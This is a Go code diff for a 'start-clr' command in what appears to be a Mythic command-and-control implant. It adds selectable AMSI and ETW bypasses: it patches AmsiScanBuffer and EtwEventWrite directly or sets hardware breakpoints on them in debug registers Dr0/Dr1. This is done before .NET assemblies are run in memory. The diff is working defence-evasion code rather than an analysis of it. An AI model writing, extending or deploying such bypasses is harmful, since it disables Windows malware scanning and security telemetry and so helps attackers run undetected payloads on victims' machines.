@@ -4,6 +4,7 @@
 package commands
 
 import (
+	"encoding/json"
 	"fmt"
 	"runtime"
 	"sync"
@@ -29,7 +30,13 @@ func (c *StartCLRCommand) Name() string {
 
 // Description returns the command description
 func (c *StartCLRCommand) Description() string {
-	return "Initialize the .NET CLR runtime and load AMSI.dll in the current process"
+	return "Initialize the .NET CLR runtime with optional AMSI/ETW patching"
+}
+
+// StartCLRParams represents the JSON parameters from the Mythic modal
+type StartCLRParams struct {
+	AmsiPatch string `json:"amsi_patch"`
+	EtwPatch  string `json:"etw_patch"`
 }
 
 // Execute executes the start-clr command
@@ -46,42 +53,117 @@ func (c *StartCLRCommand) Execute(task structs.Task) structs.CommandResult {
 		}
 	}
 
-	// Check if CLR is already initialized
-	if clrInitialized {
-		return structs.CommandResult{
-			Output:    "CLR already initialized in this process",
-			Status:    "completed",
-			Completed: true,
+	// Parse parameters (default to "None" if empty/missing for backward compat)
+	var params StartCLRParams
+	if task.Params != "" {
+		if err := json.Unmarshal([]byte(task.Params), &params); err != nil {
+			return structs.CommandResult{
+				Output:    fmt.Sprintf("Error parsing parameters: %v", err),
+				Status:    "error",
+				Completed: true,
+			}
 		}
+	}
+	if params.AmsiPatch == "" {
+		params.AmsiPatch = "None"
+	}
+	if params.EtwPatch == "" {
+		params.EtwPatch = "None"
 	}
 
 	var output string
 
-	// Load and initialize the CLR using go-clr
-	// LoadCLR will handle checking if it's already loaded
-	_, err := clr.LoadCLR("v4.0.30319")
-	if err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error initializing CLR: %v", err),
-			Status:    "error",
-			Completed: true,
+	// Check if CLR is already initialized
+	if clrInitialized {
+		output += "[*] CLR already initialized in this process\n"
+	} else {
+		// Load and initialize the CLR using go-clr
+		_, err := clr.LoadCLR("v4.0.30319")
+		if err != nil {
+			return structs.CommandResult{
+				Output:    fmt.Sprintf("Error initializing CLR: %v", err),
+				Status:    "error",
+				Completed: true,
+			}
+		}
+		output += "[+] CLR v4.0.30319 runtime initialized successfully\n"
+
+		// Explicitly load AMSI.dll (needed for patching regardless of method)
+		err = loadAMSI()
+		if err != nil {
+			output += fmt.Sprintf("[-] Warning: Failed to load AMSI.dll: %v\n", err)
+		} else {
+			output += "[+] AMSI.dll loaded successfully\n"
+		}
+
+		clrInitialized = true
+	}
+
+	// Apply AMSI Autopatch
+	if params.AmsiPatch == "Autopatch" {
+		output += "\n[*] Applying AMSI Autopatch (amsi.dll!AmsiScanBuffer)...\n"
+		patchOutput, err := PerformAutoPatch("amsi.dll", "AmsiScanBuffer", 300)
+		if err != nil {
+			output += fmt.Sprintf("[-] AMSI Autopatch failed: %v\n", err)
+		} else {
+			output += patchOutput + "\n"
 		}
 	}
-	output += "[+] CLR v4.0.30319 runtime initialized successfully\n"
 
-	// Step 2: Explicitly load AMSI.dll
-	err = loadAMSI()
-	if err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("%s[-] Warning: Failed to load AMSI.dll: %v", output, err),
-			Status:    "completed",
-			Completed: true,
+	// Apply ETW Autopatch
+	if params.EtwPatch == "Autopatch" {
+		output += "\n[*] Applying ETW Autopatch (ntdll.dll!EtwEventWrite)...\n"
+		patchOutput, err := PerformAutoPatch("ntdll.dll", "EtwEventWrite", 300)
+		if err != nil {
+			output += fmt.Sprintf("[-] ETW Autopatch failed: %v\n", err)
+		} else {
+			output += patchOutput + "\n"
 		}
 	}
-	output += "[+] AMSI.dll loaded successfully\n"
 
-	clrInitialized = true
-	output += "\n[*] CLR and AMSI are now loaded. You may now patch AMSI before executing assemblies."
+	// Apply Hardware Breakpoint patches (AMSI and/or ETW)
+	needHWBP := params.AmsiPatch == "Hardware Breakpoint" || params.EtwPatch == "Hardware Breakpoint"
+	if needHWBP {
+		output += "\n[*] Setting up Hardware Breakpoint patches...\n"
+
+		var amsiAddr, etwAddr uintptr
+
+		if params.AmsiPatch == "Hardware Breakpoint" {
+			addr, err := resolveFunctionAddress("amsi.dll", "AmsiScanBuffer")
+			if err != nil {
+				output += fmt.Sprintf("[-] Failed to resolve AmsiScanBuffer: %v\n", err)
+			} else {
+				amsiAddr = addr
+				output += fmt.Sprintf("[+] AmsiScanBuffer at 0x%X -> Dr0\n", addr)
+			}
+		}
+
+		if params.EtwPatch == "Hardware Breakpoint" {
+			addr, err := resolveFunctionAddress("ntdll.dll", "EtwEventWrite")
+			if err != nil {
+				output += fmt.Sprintf("[-] Failed to resolve EtwEventWrite: %v\n", err)
+			} else {
+				etwAddr = addr
+				output += fmt.Sprintf("[+] EtwEventWrite at 0x%X -> Dr1\n", addr)
+			}
+		}
+
+		if amsiAddr != 0 || etwAddr != 0 {
+			hwbpOutput, err := SetupHardwareBreakpoints(amsiAddr, etwAddr)
+			if err != nil {
+				output += fmt.Sprintf("[-] Hardware Breakpoint setup failed: %v\n", err)
+			} else {
+				output += hwbpOutput
+			}
+		}
+	}
+
+	// Summary
+	if params.AmsiPatch == "None" && params.EtwPatch == "None" {
+		output += "\n[*] No patches selected. You may manually patch before executing assemblies."
+	} else {
+		output += "\n[+] CLR initialized and patches applied. Ready for assembly execution."
+	}
 
 	return structs.CommandResult{
 		Output:    output,
